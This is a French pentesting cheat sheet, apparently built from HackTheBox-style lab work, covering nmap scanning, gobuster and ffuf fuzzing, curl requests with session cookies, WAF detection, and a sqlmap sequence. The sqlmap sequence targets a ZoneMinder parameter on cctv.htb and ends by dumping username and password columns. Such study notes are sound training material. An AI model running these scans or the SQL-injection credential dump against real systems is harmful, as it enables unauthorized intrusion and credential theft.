---
title: "Enumeration"
date: 2026-04-03T01:28:30+02:00
draft: false
showToc: true
TocOpen: true
---
{{< notice type="info" >}}
En cours de création. Je pense fusionner cette page et la page pentestweb.
{{< /notice >}}

## Nmap

### TCP Scan
Scan complet des services avec scripts par défaut.
```bash
nmap -sC -sV -p- <IP> -v
```
Scan rapide 
```bash
nmap -sV -T4 --top-ports 1000 <IP>
```

### UDP Scan
Scan des ports UDP les plus courants (nécessite sudo).
```bash
sudo nmap -sU -sV -F <IP>
```
> Attention les scan UDP sont longs

### Options et Modificateurs

| Option | Fonction | Utilité |
| :--- | :--- | :--- |
| `-p-` | Tous les ports | Scanne de 1 à 65535 (indispensable) |
| `-F` | Mode rapide | Top 100 ports uniquement |
| `-sC` | Scripts par défaut | Détecte les vulnérabilités basiques |
| `-sV` | Versions | Identifie la version précise du service |
| `-sU` | Scan UDP | Pour DNS, SNMP, DHCP, etc. |
| `-Pn` | No Ping | Ignore si l'hôte répond au ping (pare-feu) |
| `-T4` | Vitesse (0-5) | 4 est le meilleur compromis rapidité/fiabilité |
| `-v` | Verbose | Affiche les ports trouvés en temps réel |
| `-oN file` | Output | Sauvegarde le résultat dans un fichier texte |
| `-A` | Agressif | Raccourci pour : `-sV -sC -O --traceroute` |
| `--max-retries` | Limite d'essais | Réduire pour accélérer sur réseau instable |

---

## Web Fuzzing

### Gobuster
exploration de contenu 
```bash
gobuster dir -u <URL> -w ~/Documents/lists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
```
```
gobuster dir -u http://2million.htb -w ~/Documents/lists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -k --exclude-length 162
```

exploration des sous-domaines
```bash
gobuster vhost -u <URL> -w ~/Documents/lists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
```

| Option | Fonction | Utilité |
| :--- | :--- | :--- |
| `-u` | URL | Adresse de la cible (ex: http://10.10.11.1) |
| `-w` | Wordlist | Chemin vers le dictionnaire (ex: /usr/share/wordlists/...) |
| `-x` | Extensions | Cherche des fichiers (ex: -x php,js,txt) |
| `-t` | Threads | Nombre de connexions simultanées (défaut 10, monter à 50 pour plus de vitesse) |
| `-k` | Insecure | Ignore les erreurs de certificat SSL (pour le HTTPS) |
| `-o` | Output | Sauvegarde le résultat dans un fichier |

### ffuf

`ffuf` est l'outil de brute-force web le plus rapide. Il utilise le mot-clé **FUZZ** pour indiquer où injecter les mots de la liste.

#### Fuzzing de répertoire classique
**Quand l'utiliser :** Pour découvrir des dossiers cachés à la racine d'un site.
```bash
ffuf -u <URL>/FUZZ -w ~/Documents/lists/KaliLists/dirbuster/directory-list-2.3-medium.txt
```

#### Fuzzing de Vhost / Sous-domaines
**Quand l'utiliser :** Lorsque l'IP héberge plusieurs sites (Virtual Hosts). On modifie l'en-tête `Host` sans changer l'URL.
* **`-ac`** : Auto-calibration (ignore les fausses pages 200).
* **`-k`** : Ignore les erreurs de certificats SSL.

```bash
ffuf -u [http://SITE.com](http://SITE.com) -H "Host: FUZZ.SITE.com" -w ~/Documents/lists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
```

#### Fuzzing avec extensions (Fichiers)
**Quand l'utiliser :** Pour trouver des fichiers précis comme des scripts PHP, des sauvegardes ou du texte.
* **`-e`** : Liste d'extensions à tester (ex: `.php`, `.bak`).
```bash
ffuf -w ~/Documents/lists/SecLists/Discovery/Web-Content/common.txt -u http://<IP>/FUZZ -e .php,.html,.txt,.bak,.js -v
```

#### Fuzzing Récursif
**Quand l'utiliser :** Pour que `ffuf` entre automatiquement dans chaque dossier trouvé et recommence le scan à l'intérieur.
* **`-recursion`** : Active la recherche dans les sous-dossiers.
* **`-ic`** : Ignore les commentaires dans la wordlist.
```bash
ffuf -w ~/Documents/lists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic -v -u http://<IP>/FUZZ -e .html -recursion
```

| Option | Fonction | Utilité |
| :--- | :--- | :--- |
| `-u` | URL | URL cible contenant le mot `FUZZ` |
| `-w` | Wordlist | Chemin vers le dictionnaire |
| `-fc` | Filter Code | Cache certains codes HTTP (ex: -fc 404,403) |
| `-fs` | Filter Size | Cache les réponses d'une taille précise (utile pour ignorer les fausses pages) |
| `-recursion` | Récursif | Scanne automatiquement les sous-dossiers trouvés |
| `-v` | Verbose | Affiche l'URL complète pour chaque résultat |
---

## curl

`curl` permet d'interagir précisément avec les points d'entrée trouvés par `ffuf`.

#### exemple
Tester des formulaires de recherche ou des APIs qui nécessitent d'être connecté.
```bash
curl -X POST -d '{"search":"flag"}' \
     -b 'PHPSESSID=9f03g9pvp20u83r8ju4cfoohrq' \
     -H 'Content-Type: application/json' \
     http://<IP>/search.php
```

#### Lexique des drapeaux (Flags)
| Flag | Description |
| :--- | :--- |
| **`-X POST`** | Définit la méthode HTTP (POST, PUT, DELETE). |
| **`-d`** | "Data" : Le corps de la requête (payload JSON, paramètres). |
| **`-b`** | "Cookie" : Envoie un cookie de session (ex: PHPSESSID). |
| **`-H`** | "Header" : Ajoute un en-tête (indispensable pour spécifier `application/json`). |
| **`-i`** | Affiche les en-têtes de réponse (pour voir les nouveaux cookies). |
| **`-L`** | Suit les redirections (301/302). |


## DNS
```bash
dig <URL>
```

## Génération de wordlist 
```bash
cewl <URL>/page
```

## Identification WAF
```bash
wafw00f -v <URL>
```

## SQLMAP
### LISTER LES BASES  : 

```bash
sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --cookie="ZMSESSID=c9r2p3g3fa158huecptlm3ptsp" --batch --dbs
```

- `--batch` permet de répondre oui automatiquement
- `--dbs` permet de lister les bdd présentes sur le serveur 
- `--cookie`si besoin d’une authentification, recup le cookie et l’indiquer

### Lister les tables de la base `zm`

```bash
sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --cookie="ZMSESSID=c9r2p3g3fa158huecptlm3ptsp" --batch -D zm --tables
```

- **`-D zm`** : On précise qu'on veut travailler uniquement sur la base `zm`.
- **`--tables`** : On demande la liste des tables (cherche quelque chose comme `Users`, `Accounts` ou `Users_Accounts`).

### Lister les colonnes d'une table intéressante

S'il y a une table nommée **`Users`** :

```bash
sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --cookie="ZMSESSID=c9r2p3g3fa158huecptlm3ptsp" --batch -D zm -T Users --columns
```

- **`-T Users`** : On cible la table des utilisateurs.
- **`--columns`** : On veut voir les noms des colonnes (ex: `Username`, `Password`).


#### Extraire les mots de passe

S'il y a les colonnes `Username` et `Password`, c'est le moment du **DUMP** final :

```bash
sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --cookie="ZMSESSID=c9r2p3g3fa158huecptlm3ptsp" --batch -D zm -T Users -C "Username,Password" --dump
```
